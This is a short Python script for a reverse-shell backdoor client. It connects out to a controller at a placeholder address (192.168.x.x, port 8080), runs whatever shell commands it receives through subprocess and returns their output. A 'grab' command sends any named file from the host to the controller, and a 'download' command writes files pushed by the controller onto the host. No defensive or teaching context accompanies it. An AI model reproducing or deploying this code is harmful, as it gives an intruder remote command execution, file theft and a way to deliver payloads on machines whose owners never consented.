import socket
import subprocess
import os
 
def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())
 
def download(s, command):
    instruction, path = command.split('*')
    # going to put target file in working directory
    # so discard  original path from server
    path = path.split('/')[-1]
    f = open(path, 'wb')
    while True:
        bits = s.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            break
        f.write(bits)
        
def connect():
    s = socket.socket()
    s.connect(("192.168.x.x", 8080))
 
    while True:
        command = s.recv(1024).decode()
 
        if 'terminate' in command:
            s.close()
            break
        
        elif 'grab' in command:
            grab, path = command.split('*')
            try:
                transfer(s, path)
            except:
                pass
 
        elif 'download' in command:
            try:
                download(s, command)
                s.send('[+] Transfer Complete'.encode())
            except:
                s.send('[-] There was a problem with the transfer'.encode())
        else:
            CMD = subprocess.Popen(command,
                    shell=True, stdout= subprocess.PIPE,
                    stderr= subprocess.PIPE, stdin=subprocess.PIPE)
            result = b''.join(CMD.communicate())
            
            if len(result.decode()) == 0:
                result = 'Success'.encode()
            
            s.send(result)
 
def main():
    connect()
 
main()
